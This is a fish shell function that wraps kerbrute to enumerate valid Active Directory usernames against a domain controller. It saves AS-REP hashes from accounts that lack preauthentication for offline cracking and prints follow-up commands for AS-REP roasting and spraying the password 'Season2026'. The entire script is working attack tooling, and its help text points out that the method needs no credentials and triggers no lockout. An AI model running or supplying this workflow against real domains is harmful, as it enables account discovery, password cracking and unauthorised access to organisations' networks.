function nacheck --description "which names in a list exist in the domain, via kerbrute userenum"
    argparse 't/threads=' -- $argv
    or return 1

    if test (count $argv) -ne 3
        echo "usage: nacheck DC_IP DOMAIN LIST [-t THREADS]"
        echo "  LIST  one candidate username per line, any case, with or without @domain"
        echo "  valid names land in nacheck-DC_IP/valid.txt, ready for roast -U and spray -U"
        echo "  no credential needed, no lockout: a Kerberos AS-REQ without preauth is not a logon attempt"
        return 1
    end
    set -l ip $argv[1]
    set -l domain $argv[2]
    set -l list $argv[3]
    set -l threads 10
    set -q _flag_threads; and set threads $_flag_threads

    if not test -s "$list"
        echo "[!] $list missing or empty"
        return 1
    end

    # kerbrute is not a Kali package. One static Go binary from
    # github.com/ropnop/kerbrute/releases, dropped anywhere on PATH.
    set -l kb
    for cand in kerbrute kerbrute_linux_amd64
        command -q $cand; and set kb $cand; and break
    end
    if test -z "$kb"
        echo "[!] kerbrute not found. Not a Kali package: download kerbrute_linux_amd64 from"
        echo "    https://github.com/ropnop/kerbrute/releases, chmod +x, move to /usr/local/bin/kerbrute"
        return 1
    end

    set -l out "nacheck-$ip"
    mkdir -p $out
    set -l clean "$out/candidates.txt"
    set -l raw "$out/kerbrute.txt"
    set -l valid "$out/valid.txt"

    # normalise: strip @domain, lowercase, drop blanks and dupes. Kerberos names
    # are case-insensitive, so lowercase is the canonical form for every later tool
    string replace -r '@.*$' '' <$list | string lower | string trim | string match -rv '^$' | sort -u >$clean
    set -l n (count (cat $clean))
    echo "[*] $n candidate names"

    __run $kb userenum --dc $ip -d $domain -t $threads -o $raw $clean

    # 2026/10/19 16:55:01 >  [+] VALID USERNAME:  fiona.clark@nagoya-industries.com
    # 2026/10/19 16:55:01 >  [+] user@domain has no pre auth required. Dumping hash to crack offline:
    # $krb5asrep$18$user@DOMAIN:....
    string replace -rf '.*VALID USERNAME:\s+([^@\s]+)@.*' '$1' <$raw | string lower | sort -u >$valid
    set -l asrep "$out/asrep.txt"
    grep -E '^\$krb5asrep\$' $raw >$asrep 2>/dev/null
    test -s $asrep; or rm -f $asrep

    echo
    set -l v (count (cat $valid))
    if test $v -eq 0
        echo "[*] 0 of $n exist. The naming convention is wrong, not the names: try first.last, flast, f.last, firstl, first"
        echo "    kerbrute cannot tell a wrong convention from an empty domain, so this is the thing to vary"
        return 1
    end
    echo "[*] $v of $n exist in $domain  -> $valid"
    cat $valid | sed 's/^/    /'
    if test -s "$asrep"
        echo
        echo "[*] "(count (cat $asrep))" of them have preauth off, kerbrute dumped the AS-REP hash already -> $asrep"
        chash (head -1 $asrep)
    end
    echo
    echo "[*] next:"
    echo "    roast $ip $domain -U $valid              # AS-REP the confirmed names (etype 23 output, kerbrute gives 18)"
    echo "    spray $ip -U $valid -p 'Season2026' -d $domain   # one password across confirmed names, lockout policy first"
end
